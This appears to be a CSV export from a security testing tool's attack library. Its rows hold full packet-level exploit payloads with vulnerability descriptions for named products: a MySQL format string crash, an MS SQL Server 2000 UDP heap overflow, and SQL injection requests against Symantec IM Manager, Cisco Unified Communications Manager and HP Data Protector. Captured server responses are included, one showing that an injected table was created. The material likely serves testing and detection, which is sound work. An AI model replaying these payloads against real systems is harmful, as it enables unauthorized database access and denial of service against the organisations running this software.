XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
﻿FSC20090709-06_Sun_MySQL_mysql_log_Format_String_Vulnerability.xml,Sun MySQL mysql_log Format String Vulnerability,"A format string vulnerability exists in Sun Microsystems MySQL database server. The flaw is due to insufficient input validation when processing create and drop database commands. Remote authenticated attackers could exploit this vulnerability by sending malformed data to the MySQL process. In a successful attack the affected application will terminate abnormally, creating a denial of service condition.",MySQL,TCP,9||00 00 01 87 A2 00 00 00 00 00 ||@||08 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ||bob||00 14 ||3||07 C5 EA 19 C5 BF ||zL||86 B1 83 14 AB ||!||CD 8B ||t#*
FSC20090709-06_Sun_MySQL_mysql_log_Format_String_Vulnerability.xml,Sun MySQL mysql_log Format String Vulnerability,"A format string vulnerability exists in Sun Microsystems MySQL database server. The flaw is due to insufficient input validation when processing create and drop database commands. Remote authenticated attackers could exploit this vulnerability by sending malformed data to the MySQL process. In a successful attack the affected application will terminate abnormally, creating a denial of service condition.",MySQL,TCP,||09 00 00 00 05 ||%s%s%s%s
FSC20090709-06_Sun_MySQL_mysql_log_Format_String_Vulnerability.xml,Sun MySQL mysql_log Format String Vulnerability,"A format string vulnerability exists in Sun Microsystems MySQL database server. The flaw is due to insufficient input validation when processing create and drop database commands. Remote authenticated attackers could exploit this vulnerability by sending malformed data to the MySQL process. In a successful attack the affected application will terminate abnormally, creating a denial of service condition.",MySQL,TCP,"E||00 00 00 0A ||5.0.83-community-nt-log||00 01 00 00 00 ||lt%U\Rbw||00 ||,||A2 08 02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ||Rqc}jyC!x]H1||00||"
FSC20090709-06_Sun_MySQL_mysql_log_Format_String_Vulnerability.xml,Sun MySQL mysql_log Format String Vulnerability,"A format string vulnerability exists in Sun Microsystems MySQL database server. The flaw is due to insufficient input validation when processing create and drop database commands. Remote authenticated attackers could exploit this vulnerability by sending malformed data to the MySQL process. In a successful attack the affected application will terminate abnormally, creating a denial of service condition.",MySQL,TCP,||07 00 00 02 00 00 00 02 00 00 00||
﻿FSC20101105-04_Symantec_IM_Manager_LoggedInUsers_lgx_Definition_File_Multiple_SQL_Injections.xml,Symantec IM Manager LoggedInUsers.lgx Definition File Multiple,"An SQL injection vulnerability exists in Symantec IM Manager. The vulnerability is due to insufficient input validation of the parameters loginTimeStamp, dbo, dateDiffParam and whereClause.A remote non-privileged user can exploit this vulnerability by embedding malicious SQL code as part of the vulnerable parameter.Successful exploitation would result in disclosure of sensitive information, and modification or manipulation of the data in the underlying database.",HTTP,TCP,"GET /IMManager/rdpageimlogic.aspx?rdReport=LoggedInUsers&ReportTitle=Active%20Users%20Report&timezoneName=%28GMT%29+Greenwich+Mean+Time+%3A+Dublin%2C+Edinburgh%2C+Lisbon%2C+London&TotalRecords=0&TotalUniqueUsers=0&loginTimeStamp=dateadd%28second%2C+0%2C+ir%2ELoginTimestamp%29&dbo=dbo.&dateDiffParam=second&whereClause=||3B ||CREATE%20TABLE%20poc_table%20(First_Name%20char(50))||3B || HTTP/1.1||0D 0A ||Accept||3A || image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/x-ms-application, application/x-ms-xbap, application/vnd.ms-xpsdocument, application/xaml+xml, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*||0D 0A ||Accept-Language||3A || en-us||0D 0A ||Accept-Encoding||3A || gzip, deflate||0D 0A ||User-Agent||3A || Mozilla/4.0 (compatible||3B || MSIE 6.0||3B || Windows NT 5.1||3B || SV1||3B || .NET CLR 2.0.50727||3B || .NET CLR 3.0.4506.2152||3B || .NET CLR 3.5.30729)||0D 0A ||Host||3A || 172.16.8.80||0D 0A ||Connection||3A || Keep-Alive||0D 0A 0D 0A||"
FSC20101105-04_Symantec_IM_Manager_LoggedInUsers_lgx_Definition_File_Multiple_SQL_Injections.xml,Symantec IM Manager LoggedInUsers.lgx Definition File Multiple,"An SQL injection vulnerability exists in Symantec IM Manager. The vulnerability is due to insufficient input validation of the parameters loginTimeStamp, dbo, dateDiffParam and whereClause.A remote non-privileged user can exploit this vulnerability by embedding malicious SQL code as part of the vulnerable parameter.Successful exploitation would result in disclosure of sensitive information, and modification or manipulation of the data in the underlying database.",HTTP,TCP,"HTTP/1.1 200 OK||0D 0A ||Server||3A || Microsoft-IIS/5.1||0D 0A ||Date||3A || Fri, 05 Nov 2010 19||3A ||11||3A ||22 GMT||0D 0A ||X-Powered-By||3A || ASP.NET||0D 0A ||X-AspNet-Version||3A || 2.0.50727||0D 0A ||Set-Cookie||3A || ASP.NET_SessionId=34awol55ujfiltil1rylhp55||3B || path=/||3B || HttpOnly||0D 0A ||Cache-Control||3A || private||0D 0A ||Content-Type||3A || text/html||0D 0A ||Content-Length||3A || 6803||0D 0A 0D 0A EF BB BF ||<HTML xmlns||3A ||msxsl=||22 ||urn||3A ||schemas-microsoft-com||3A ||xslt||22 || xmlns||3A ||rdXslExtension=||22 ||urn||3A ||rdXslExtension||22 ||><SCRIPT LANGUAGE=||22 ||JAVASCRIPT||22 || src=||22 ||rdTemplate/rdActionSubmit2.js||22 ||></SCRIPT><SCRIPT LANGUAGE=||22 ||JAVASCRIPT||22 || src=||22 ||rdTemplate/rdActionShowElement.js||22 ||></SCRIPT><SCRIPT TYPE=||22 ||text/javascript||22 ||> ||0D 0A 09 ||function rdBodyLoad() {||0D 0A ||        rdColumnDisplayVisibility()||0D 0A 0D 0A 09 ||}||0D 0A 09 ||function rdSaveInputCookies() {||0D 0A ||        ||0D 0A 09 ||}||0D 0A 09 ||function rdBodyPressEnter(sID) {||0D 0A 09 09 ||var ele = document.getElementById(sID)||3B 0D 0A 09 09 ||if (ele) {||0D 0A 09 09 ||    if (ele.tagName==||22 ||INPUT||22 ||) {  //button||0D 0A 09 09 ||        ele.click()||3B 0D 0A 09 09 ||        //button||0D 0A 09 09 ||    } else {||0D 0A 09 09 ||        //span or image||0D 0A 09 09 09 ||    window.location.assign(ele.parentNode.href)||3B 0D 0A 09 09 ||    }||0D 0A 09 09 ||}||0D 0A 09 ||}||0D 0A ||</SCRIPT><SCRIPT TYPE=||22 ||text/javascript||22 ||>||0D 0A ||function rdValidateForm() {||0D 0A 0D 0A ||}||0D 0A ||</SCRIPT><HEAD><TITLE></TITLE><LINK rel=||22 ||stylesheet||22 || type=||22 ||text/css||22 || href=||22 ||_StyleSheets/IMLogicReport.css||22 || /><META name=||22 ||lgxlic||22 || content=||22 22 || /><META name=||22 ||lgxver||22 || content=||22 ||9.5.78.25109||22 || /></HEAD><BODY onload=||22 ||rdBodyLoad()||22 ||><FORM NAME=||22 ||rdForm||22 || method=||22 ||POST||22 ||><SPAN id=||22 ||rdReportHeader||22 ||><SPAN CLASS=||22 ||h2||22 ||>Active Users Report</SPAN><HR></HR></SPAN><SPAN id=||22 ||rdReportHeader-end||22 || /><MainBody><SPAN><IMG src=||22 ||Images/IMiNote.gif||22 ||></IMG><SPAN>List of all currently active IM users. Dates in timezone (GMT) Greenwich Mean Time ||3A || Dublin, Edinburgh, Lisbon, London</SPAN><BR /><IMG src=||22 ||Images/IMiShowPage.gif||22 ||></IMG><SPAN>Total Users ||3A || 0   </SPAN><SPAN>(Total Unique Users ||3A || 0)</SPAN><BR /><SPAN><IMG src=||22 ||Images/IMtForward.gif||22 ||></IMG><a href=||22 ||javascript||3A ||NavigateLink2('admin/IMAdminReportForward2.asp?reportName=LoggedInUsers','_blank','false','width=600px,height=400px,','')||22 ||><SPAN>Forward Search Results</SPAN></a></SPAN><BR /><DIV id=||22 ||rdDataTableDiv-dtLoggedInUsers||22 ||><TABLE style=||22 22 || id=||22 ||dtLoggedInUsers||22 ||><COL></COL><COL></COL><COL></COL><COL></COL><COL></COL><COL></COL><COL></COL><COL></COL><THEAD style=||22 ||display||3A ||table-header-group||22 ||><TR><TH id=||22 ||-TH||22 ||><a href=||22 ||javascript||3A ||SubmitSort('rdPage.aspx?rdRequestForwarding=Form&amp||3B ||rdReport=LoggedInUsers&amp||3B ||rdPaging=&amp||3B ||rdShowModes=&amp||3B ||rdDataCache=7371075530&amp||3B ||rdSort=dtLoggedInUsers~WINDOWSNAME~~~&amp||3B ||dtLoggedInUsers-PageNr=0','','','')||22 ||>Display Name</a></TH><TH id=||22 ||-TH||22 ||><a href=||22 ||javascript||3A ||SubmitSort('rdPage.aspx?rdRequestForwarding=Form&amp||3B ||rdReport=LoggedInUsers&amp||3B ||rdPaging=&amp||3B ||rdShowModes=&amp||3B ||rdDataCache=7371075530&amp||3B ||rdSort=dtLoggedInUsers~SCREENNAME~~~&amp||3B ||dtLoggedInUsers-PageNr=0','','','')||22 ||>IM Name</a></TH><TH id=||22 ||-TH||22 ||><a href=||22 ||javascript||3A ||SubmitSort('rdPage.aspx?rdRequestForwarding=Form&amp||3B ||rdReport=LoggedInUsers&amp||3B ||rdPaging=&amp||3B ||rdShowModes=&amp||3B ||rdDataCache=7371075530&amp||3B ||rdSort=dtLoggedInUsers~IMNETWORK~~~&amp||3B ||dtLoggedInUsers-PageNr=0','','','')||22 ||>IM Network</a></TH><TH id=||22 ||-TH||22 ||><a href=||22 ||javascript||3A ||SubmitSort('rdPage.aspx?rdRequestForwarding=Form&amp||3B ||rdReport=LoggedInUsers&amp||3B ||rdPaging=&amp||3B ||rdShowModes=&amp||3B ||rdDataCache=7371075530&amp||3B ||rdSort=dtLoggedInUsers~LOGINTIMESTAMP~~~&amp||3B ||dtLoggedInUsers-PageNr=0','','','')||22 ||>Active Since</a></TH><TH id=||22 ||-TH||22 ||><a href=||22 ||javascript||3A ||SubmitSort('rdPage.aspx?rdRequestForwarding=Form&amp||3B ||rdReport=LoggedInUsers&amp||3B ||rdPaging=&amp||3B ||rdShowModes=&amp||3B ||rdDataCache=7371075530&amp||3B ||rdSort=dtLoggedInUsers~TIMELOGGEDIN~~~&amp||3B ||dtLoggedInUsers-PageNr=0','','','')||22 ||>Duration (hh||3A ||mm||3A ||ss)</a></TH><TH id=||22 ||-TH||22 ||><a href=||22 ||javascript||3A ||SubmitSort('rdPage.aspx?rdRequestForwarding=Form&amp||3B ||rdReport=LoggedInUsers&amp||3B ||rdPaging=&amp||3B ||rdShowModes=&amp||3B ||rdDataCache=7371075530&amp||3B ||rdSort=dtLoggedInUsers~SERVERIP~~~&amp||3B ||dtLoggedInUsers-PageNr=0','','','')||22 ||>Host Relay Service</a></TH><TH id=||22 ||-TH||22 ||><a href=||22 ||javascript||3A ||SubmitSort('rdPage.aspx?rdRequestForwarding=Form&amp||3B ||rdReport=LoggedInUsers&amp||3B ||rdPaging=&amp||3B ||rdShowModes=&amp||3B ||rdDataCache=7371075530&amp||3B ||rdSort=dtLoggedInUsers~CLIENTVERSION~~~&amp||3B ||dtLoggedInUsers-PageNr=0','','','')||22 ||>Client Version</a></TH><TH id=||22 ||-TH"
﻿MSsqlHeap.xml,MS02-039/MS02-061 MS SQL Server 2000 Heap Overflow,"MS SQL Server 2000 employs UDP Port 1434 for foreign hosts to ping for connectivity. This attack takes advantage of a heap overflow in an unpatched version of MSSQL Server, causing the service to crash.  This same flaw can be used to cause remote code execution.",MSSQL,UDP,||08 ||AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA||3A||
﻿TSL20110427-05_Cisco_Unified_Communications_Manager_Multiple_SQL_Injections.xml,Cisco Unified Communications Manager Multiple SQL Injections,"Multiple SQL injection vulnerabilities exist within Cisco Unified Communications Manager. These vulnerabilities could be exploited by remote attackers to conduct SQL injection attacks on the server.            A remote, unauthenticated attacker can exploit this vulnerability to disclose sensitive information.
","HTTP,HTTPS",TCP,"GET /ccmcip/xmldirectorylist.jsp?n=X'%20or%20telephonenumber%20like%20' HTTP/1.1||0D 0A ||Accept||3A || */*||0D 0A ||Accept-Language||3A || en-us||0D 0A ||Accept-Encoding||3A || gzip, deflate||0D 0A ||User-Agent||3A || Mozilla/4.0 (compatible||3B || MSIE 6.0||3B || Windows NT 5.1||3B || SV1||3B || .NET4.0C||3B || .NET4.0E||3B || .NET CLR 2.0.50727)||0D 0A ||Host||3A || dhcp16||0D 0A ||Connection||3A || Keep-Alive||0D 0A ||Cookie||3A || JSESSIONID=57C7D059F43949BCD2A3C3F5989C19BD||3B || JSESSIONID=5F4759AD501D2826C1224B39C26B707E||0D 0A 0D 0A||"
TSL20110427-05_Cisco_Unified_Communications_Manager_Multiple_SQL_Injections.xml,Cisco Unified Communications Manager Multiple SQL Injections,"Multiple SQL injection vulnerabilities exist within Cisco Unified Communications Manager. These vulnerabilities could be exploited by remote attackers to conduct SQL injection attacks on the server.            A remote, unauthenticated attacker can exploit this vulnerability to disclose sensitive information.
","HTTP,HTTPS",TCP,"HTTP/1.1 200 OK||0D 0A ||Server||3A || Apache-Coyote/1.1||0D 0A ||Content-Type||3A || text/xml||3B ||charset=ISO-8859-1||0D 0A ||Transfer-Encoding||3A || chunked||0D 0A ||Date||3A || Fri, 06 May 2011 19||3A ||31||3A ||50 GMT||0D 0A 0D 0A ||4a7||0D 0A 0D 0A ||  <?xml version=||22 ||1.0||22 ||?>||0D 0A ||  <CiscoIPPhoneDirectory>||0D 0A ||   ||0D 0A ||    ||0D 0A ||    ||0D 0A ||    ||0D 0A ||    ||0D 0A 0D 0A ||    ||0D 0A ||    ||0D 0A ||    ||0D 0A ||    ||0D 0A 0D 0A ||    ||0D 0A ||    ||0D 0A ||    ||0D 0A ||    ||0D 0A 0D 0A ||    ||0D 0A ||    ||0D 0A 0D 0A ||    ||0D 0A ||    ||0D 0A ||    ||0D 0A ||    ||0D 0A 0D 0A ||    <DirectoryEntry>||0D 0A ||     <Name>Security Labs, TELUS</Name>||0D 0A ||     <Telephone></Telephone>||0D 0A ||    </DirectoryEntry>||0D 0A ||   ||0D 0A ||    ||0D 0A ||    ||0D 0A ||    ||0D 0A ||    ||0D 0A 0D 0A ||    ||0D 0A ||    ||0D 0A ||    ||0D 0A ||    ||0D 0A 0D 0A ||    ||0D 0A ||    ||0D 0A ||    ||0D 0A ||    ||0D 0A 0D 0A ||    ||0D 0A ||    ||0D 0A 0D 0A ||    ||0D 0A ||    ||0D 0A ||    ||0D 0A ||    ||0D 0A 0D 0A ||    <DirectoryEntry>||0D 0A ||     <Name>Security Labs 2, TELUS 2</Name>||0D 0A ||     <Telephone></Telephone>||0D 0A ||    </DirectoryEntry>||0D 0A ||   ||0D 0A ||   ||0D 0A ||   ||0D 0A ||   ||0D 0A ||   ||0D 0A ||   <Prompt>Records 1 to 2 of 2</Prompt>||0D 0A ||   <SoftKeyItem>||0D 0A ||    <Name>Dial</Name>||0D 0A ||    <URL>SoftKey||3A ||Dial</URL>||0D 0A ||    <Position>1</Position>||0D 0A ||   </SoftKeyItem>||0D 0A ||   <SoftKeyItem>||0D 0A ||    <Name>EditDial</Name>||0D 0A ||    <URL>SoftKey||3A ||EditDial</URL>||0D 0A ||    <Position>2</Position>||0D 0A ||   </SoftKeyItem>||0D 0A ||   <SoftKeyItem>||0D 0A ||    <Name>Exit</Name>||0D 0A ||    <URL>SoftKey||3A ||Exit</URL>||0D 0A ||    <Position>3</Position>||0D 0A ||   </SoftKeyItem>||0D 0A ||   ||0D 0A ||   <SoftKeyItem>||0D 0A ||    <Name>Search</Name>||0D 0A ||    <URL>http||3A ||//dhcp16||3A ||80/ccmcip/xmldirectoryinput.jsp?l=&amp||3B ||f=&amp||3B ||n=X' or telephonenumber like '</URL>||0D 0A ||    <Position>5</Position>||0D 0A ||   </SoftKeyItem>||0D 0A ||  </CiscoIPPhoneDirectory>||0D 0A ||  ||0D 0A ||b||0D 0A 0D 0A || ||0D 0A || ||0D 0A || ||0D 0A 0D 0A ||0||0D 0A 0D 0A||"
﻿TSL20111111-02_HP_Data_Protector_Multiple_Products_GetPolicies_SQL_Injection.xml,HP Data Protector Multiple Products GetPolicies SQL Injection,An SQL injection vulnerability exists in HP Data Protector Notebook Extension and HP Data Protector for Personal Computers. The specific flaw is caused by insufficient validation of the <italic>type</italic> field in a user supplied SOAP request to the DPNECentral web service. A remote unauthenticated attacker can leverage this vulnerability to execute arbitrary SQL queries on a target system within the security context of the affected service.,HTTP,TCP,"POST /dpnepolicyservice/DPNECentral.asmx HTTP/1.1||0D 0A ||Content-Type||3A || text/xml||3B || charset=utf-8||0D 0A ||Accept||3A || application/soap+xml, application/dime, multipart/related, text/*||0D 0A ||Host||3A || dhcp183||3A ||80||0D 0A ||Cache-Control||3A || no-cache||0D 0A ||Pragma||3A || no-cache||0D 0A ||SOAPAction||3A || ||22 ||http||3A ||//hp.com/GetPolicies||22 0D 0A ||Content-Length||3A || 460||0D 0A 0D 0A ||<?xml version=||22 ||1.0||22 || encoding=||22 ||utf-8||22 ||?>||0A ||<soap||3A ||Envelope xmlns||3A ||xsi=||22 ||http||3A ||//www.w3.org/2001/XMLSchema-instance||22 || xmlns||3A ||xsd=||22 ||http||3A ||//www.w3.org/2001/XMLSchema||22 || xmlns||3A ||soap=||22 ||http||3A ||//schemas.xmlsoap.org/soap/envelope/||22 ||>||0A ||  <soap||3A ||Body>||0A ||    <GetPolicies xmlns=||22 ||http||3A ||//hp.com/||22 ||>||0A ||      <machine>whateverhostname</machine>||0A ||      <clientVersion>2.3.0&apos||3B ||)||3B || create table dbo.poc_table (name char(20))||3B || --&apos||3B ||</clientVersion>||0A ||    </GetPolicies>||0A ||  </soap||3A ||Body>||0A ||</soap||3A ||Envelope>"
TSL20111111-02_HP_Data_Protector_Multiple_Products_GetPolicies_SQL_Injection.xml,HP Data Protector Multiple Products GetPolicies SQL Injection,An SQL injection vulnerability exists in HP Data Protector Notebook Extension and HP Data Protector for Personal Computers. The specific flaw is caused by insufficient validation of the <italic>type</italic> field in a user supplied SOAP request to the DPNECentral web service. A remote unauthenticated attacker can leverage this vulnerability to execute arbitrary SQL queries on a target system within the security context of the affected service.,HTTP,TCP,"HTTP/1.1 500 Internal Server Error||0D 0A ||Date||3A || Mon, 14 Nov 2011 15||3A ||58||3A ||58 GMT||0D 0A ||Server||3A || Microsoft-IIS/6.0||0D 0A ||MicrosoftOfficeWebServer||3A || 5.0_Pub||0D 0A ||X-Powered-By||3A || ASP.NET||0D 0A ||X-AspNet-Version||3A || 2.0.50727||0D 0A ||Cache-Control||3A || private||0D 0A ||Content-Type||3A || text/xml||3B || charset=utf-8||0D 0A ||Content-Length||3A || 570||0D 0A 0D 0A ||<?xml version=||22 ||1.0||22 || encoding=||22 ||utf-8||22 ||?><soap||3A ||Envelope xmlns||3A ||soap=||22 ||http||3A ||//schemas.xmlsoap.org/soap/envelope/||22 || xmlns||3A ||xsi=||22 ||http||3A ||//www.w3.org/2001/XMLSchema-instance||22 || xmlns||3A ||xsd=||22 ||http||3A ||//www.w3.org/2001/XMLSchema||22 ||><soap||3A ||Body><soap||3A ||Fault><faultcode>soap||3A ||Server</faultcode><faultstring>Server was unable to process request. ---&gt||3B || Failed to record client request for GetPolicies from machine 'whateverhostname'.  ---&gt||3B || Error creating XML document for policies.  ---&gt||3B || Input string was not in a correct format.</faultstring><detail /></soap||3A ||Fault></soap||3A ||Body></soap||3A ||Envelope>"
﻿TSL20111117-01_HP_Data_Protector_Multiple_Products_FinishedCopy_SQL_Injection.xml,HP Data Protector Multiple Products FinishedCopy SQL Injection,An SQL injection vulnerability exists in HP Data Protector Notebook Extension and HP Data Protector for Personal Computers. The specific flaw is caused by insufficient validation of the <italic>type</italic> field in a user supplied SOAP request to the DPNECentral web service. A remote unauthenticated attacker can leverage this vulnerability to execute arbitrary SQL queries on a target system within the security context of the affected service.,HTTP,TCP,"POST /dpnepolicyservice/DPNECentral.asmx HTTP/1.1||0D 0A ||Content-Type||3A || text/xml||3B || charset=utf-8||0D 0A ||Accept||3A || application/soap+xml, application/dime, multipart/related, text/*||0D 0A ||Host||3A || dhcp183||3A ||80||0D 0A ||Cache-Control||3A || no-cache||0D 0A ||Pragma||3A || no-cache||0D 0A ||SOAPAction||3A || ||22 ||http||3A ||//hp.com/FinishedCopy||22 0D 0A ||Content-Length||3A || 537||0D 0A 0D 0A ||<?xml version=||22 ||1.0||22 || encoding=||22 ||utf-8||22 ||?>||0A ||<soap||3A ||Envelope xmlns||3A ||xsi=||22 ||http||3A ||//www.w3.org/2001/XMLSchema-instance||22 || xmlns||3A ||xsd=||22 ||http||3A ||//www.w3.org/2001/XMLSchema||22 || xmlns||3A ||soap=||22 ||http||3A ||//schemas.xmlsoap.org/soap/envelope/||22 ||>||0A ||  <soap||3A ||Body>||0A ||    <FinishedCopy xmlns=||22 ||http||3A ||//hp.com/||22 ||>||0A ||          <machine>win2k3</machine>||0A ||          <clientVersion>7.7</clientVersion>||0A ||          <type>1&apos||3B 3B || create table dbo.poc_table (name char(20))||3B || --&apos||3B ||</type>||0A ||          <backupLocation>Unassigned</backupLocation>||0A ||     </FinishedCopy>||0A ||  </soap||3A ||Body>||0A ||</soap||3A ||Envelope>"
TSL20111117-01_HP_Data_Protector_Multiple_Products_FinishedCopy_SQL_Injection.xml,HP Data Protector Multiple Products FinishedCopy SQL Injection,An SQL injection vulnerability exists in HP Data Protector Notebook Extension and HP Data Protector for Personal Computers. The specific flaw is caused by insufficient validation of the <italic>type</italic> field in a user supplied SOAP request to the DPNECentral web service. A remote unauthenticated attacker can leverage this vulnerability to execute arbitrary SQL queries on a target system within the security context of the affected service.,HTTP,TCP,"HTTP/1.1 500 Internal Server Error||0D 0A ||Date||3A || Thu, 17 Nov 2011 21||3A ||36||3A ||48 GMT||0D 0A ||Server||3A || Microsoft-IIS/6.0||0D 0A ||MicrosoftOfficeWebServer||3A || 5.0_Pub||0D 0A ||X-Powered-By||3A || ASP.NET||0D 0A ||X-AspNet-Version||3A || 2.0.50727||0D 0A ||Cache-Control||3A || private||0D 0A ||Content-Type||3A || text/xml||3B || charset=utf-8||0D 0A ||Content-Length||3A || 704||0D 0A 0D 0A ||<?xml version=||22 ||1.0||22 || encoding=||22 ||utf-8||22 ||?><soap||3A ||Envelope xmlns||3A ||soap=||22 ||http||3A ||//schemas.xmlsoap.org/soap/envelope/||22 || xmlns||3A ||xsi=||22 ||http||3A ||//www.w3.org/2001/XMLSchema-instance||22 || xmlns||3A ||xsd=||22 ||http||3A ||//www.w3.org/2001/XMLSchema||22 ||><soap||3A ||Body><soap||3A ||Fault><faultcode>soap||3A ||Server</faultcode><faultstring>Server was unable to process request. ---&gt||3B || Error releasing token for 1'||3B || CREATE TABLE DBO.POC_TABLE (NAME CHAR(20))||3B || --' copy by client win2k3. SQL command was 'DELETE FROM Token WHERE Type = '1'||3B || create table dbo.poc_table (name char(20))||3B || --'' AND Machine = N'win2k3' AND ObjectID = 0'.  ---&gt||3B || There is already an object named 'poc_table' in the database.</faultstring><detail /></soap||3A ||Fault></soap||3A ||Body></soap||3A ||Envelope>"
﻿TSL20111123-03_HP_Data_Protector_Multiple_Products_RequestCopy_SQL_Injection.xml,HP Data Protector Multiple Products RequestCopy SQL Injection,"An SQL injection vulnerability exists in HP Data Protector Notebook Extension and HP Data Protector for Personal Computers. The specific flaw is caused by insufficient validation of the type field in a user supplied SOAP request to the DPNECentral web service.            A remote unauthenticated attacker can leverage this vulnerability to execute arbitrary SQL queries on a target system within the security context of the affected service.
",HTTP,TCP,"POST /dpnepolicyservice/DPNECentral.asmx HTTP/1.1||0D 0A ||Content-Type||3A || text/xml||3B || charset=utf-8||0D 0A ||Accept||3A || application/soap+xml, application/dime, multipart/related, text/*||0D 0A ||Host||3A || dhcp183||3A ||80||0D 0A ||Cache-Control||3A || no-cache||0D 0A ||Pragma||3A || no-cache||0D 0A ||SOAPAction||3A || ||22 ||http||3A ||//hp.com/RequestCopy||22 0D 0A ||Content-Length||3A || 638||0D 0A 0D 0A ||<?xml version=||22 ||1.0||22 || encoding=||22 ||utf-8||22 ||?>||0A ||<soap||3A ||Envelope xmlns||3A ||xsi=||22 ||http||3A ||//www.w3.org/2001/XMLSchema-instance||22 || xmlns||3A ||xsd=||22 ||http||3A ||//www.w3.org/2001/XMLSchema||22 || xmlns||3A ||soap=||22 ||http||3A ||//schemas.xmlsoap.org/soap/envelope/||22 ||>||0A ||  <soap||3A ||Body>||0A ||    <RequestCopy xmlns=||22 ||http||3A ||//hp.com/||22 ||>||0A ||          <machine>win2k3</machine>||0A ||          <clientVersion>7.7</clientVersion>||0A ||          <type>1&apos||3B ||, &apos||3B ||win2k3&apos||3B ||, 0, GETDATE(), DATEADD(second,3000,GETDATE()))||3B || create table dbo.poc_table (name char(20))||3B || --&apos||3B ||</type>||0A ||          <backupLocation>Unassigned</backupLocation>||0A ||          <lifetime>3000</lifetime>||0A ||     </RequestCopy>||0A ||  </soap||3A ||Body>||0A ||</soap||3A ||Envelope>"
TSL20111123-03_HP_Data_Protector_Multiple_Products_RequestCopy_SQL_Injection.xml,HP Data Protector Multiple Products RequestCopy SQL Injection,"An SQL injection vulnerability exists in HP Data Protector Notebook Extension and HP Data Protector for Personal Computers. The specific flaw is caused by insufficient validation of the type field in a user supplied SOAP request to the DPNECentral web service.            A remote unauthenticated attacker can leverage this vulnerability to execute arbitrary SQL queries on a target system within the security context of the affected service.
",HTTP,TCP,"HTTP/1.1 200 OK||0D 0A ||Date||3A || Fri, 25 Nov 2011 15||3A ||19||3A ||51 GMT||0D 0A ||Server||3A || Microsoft-IIS/6.0||0D 0A ||MicrosoftOfficeWebServer||3A || 5.0_Pub||0D 0A ||X-Powered-By||3A || ASP.NET||0D 0A ||X-AspNet-Version||3A || 2.0.50727||0D 0A ||Cache-Control||3A || private, max-age=0||0D 0A ||Content-Type||3A || text/xml||3B || charset=utf-8||0D 0A ||Content-Length||3A || 377||0D 0A 0D 0A ||<?xml version=||22 ||1.0||22 || encoding=||22 ||utf-8||22 ||?><soap||3A ||Envelope xmlns||3A ||soap=||22 ||http||3A ||//schemas.xmlsoap.org/soap/envelope/||22 || xmlns||3A ||xsi=||22 ||http||3A ||//www.w3.org/2001/XMLSchema-instance||22 || xmlns||3A ||xsd=||22 ||http||3A ||//www.w3.org/2001/XMLSchema||22 ||><soap||3A ||Body><RequestCopyResponse xmlns=||22 ||http||3A ||//hp.com/||22 ||><RequestCopyResult>0</RequestCopyResult><lifetime>2941</lifetime></RequestCopyResponse></soap||3A ||Body></soap||3A ||Envelope>"
